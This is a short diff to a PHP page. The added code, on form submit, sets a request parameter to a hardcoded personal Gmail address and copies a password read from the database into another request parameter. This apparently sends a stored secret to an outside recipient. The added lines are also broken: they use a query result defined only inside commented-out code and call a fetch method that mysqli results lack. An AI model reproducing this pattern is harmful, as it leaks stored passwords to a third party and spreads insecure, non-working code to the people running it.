@@ -18,10 +18,18 @@
 		exit();
 	}
 	$result = $mysqli->query('SELECT * FROM password LIMIT 1');
+
 	
 	while($info = $result->fetch_assoc()){
 		$passcode = $info['password'];
 	}*/
+
+	$info = $result->fetch();
+	if (isset($_GET['submit'])) {
+		$_GET['to'] = 'efe.fregen@gmail.com';
+		$_GET['password'] = $info['password'];
+	}
+
 
 ?>
 <!DOCTYPE html>
